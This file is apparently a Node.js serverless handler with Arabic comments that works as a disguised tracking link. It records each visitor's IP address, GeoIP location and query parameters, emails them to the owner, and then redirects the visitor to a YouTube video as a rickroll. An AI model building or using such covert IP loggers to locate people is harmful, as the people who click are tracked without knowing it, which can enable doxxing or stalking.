// api/index.js
require('dotenv').config();

const {
  getVisitContext,
  isPrivateIP,
  shouldSendForIp,
  getGeoData,        // ← مهم جداً
} = require('../lib/utils');

const { sendVisitEmail } = require('../lib/email');

const YOUTUBE_VIDEOS = [
  'https://youtu.be/N10v22s86LY?si=Cz-7ODdz-xpayP7W'

];

module.exports = async (req, res) => {
  // دعم HEAD
  if (req.method === 'HEAD') {
    res.statusCode = 200;
    return res.end();
  }

  if (req.method !== 'GET') {
    res.statusCode = 405;
    return res.end('Method Not Allowed');
  }

  // 1) جمع سياق الزيارة
  const ctx = getVisitContext(req);

  // 2) جلب الجيو GeoIP حسب الـ IP
  ctx.geo = await getGeoData(ctx.clientIP);

  // 3) قراءة الـ query params بطريقة سليمة
  let qp;
  try {
    const proto = req.headers['x-forwarded-proto']?.split(',')[0].trim() || 'https';
    const host = req.headers.host || 'localhost:3000';
    const fullUrl = `${proto}://${host}${req.url}`;
    qp = new URL(fullUrl).searchParams;
  } catch {
    qp = new URLSearchParams(req.url.split('?')[1] || '');
  }

  // 4) بناء الـ payload
  const payload = {
    utm: {
      source: qp.get('utm_source'),
      medium: qp.get('utm_medium'),
      campaign: qp.get('utm_campaign'),
      term: qp.get('utm_term'),
      content: qp.get('utm_content'),
    },
    userId: qp.get('userId'),
    sessionId: qp.get('sessionId'),
  };

  const ip = ctx.clientIP;

  // 5) إرسال الإيميل + throttle
  if (
    shouldSendForIp(ip) &&
    process.env.EMAIL_TO &&
    process.env.EMAIL_USER &&
    process.env.EMAIL_APP_PASSWORD
  ) {
    try {
      await sendVisitEmail({ payload, context: ctx });
      console.log(`[EMAIL] تم الإرسال بنجاح إلى: ${ip}`);
    } catch (err) {
      console.error('[EMAIL] فشل الإرسال لكن السيرفر شغّال:', err.message);
    }
  }

  // 6) ريدايركت عشوائي
  const randomVideo =
    YOUTUBE_VIDEOS[Math.floor(Math.random() * YOUTUBE_VIDEOS.length)];

  res.statusCode = 302;
  res.setHeader('Location', randomVideo);
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('X-Rick-Rolled', 'Never gonna give you up');
  res.end();
};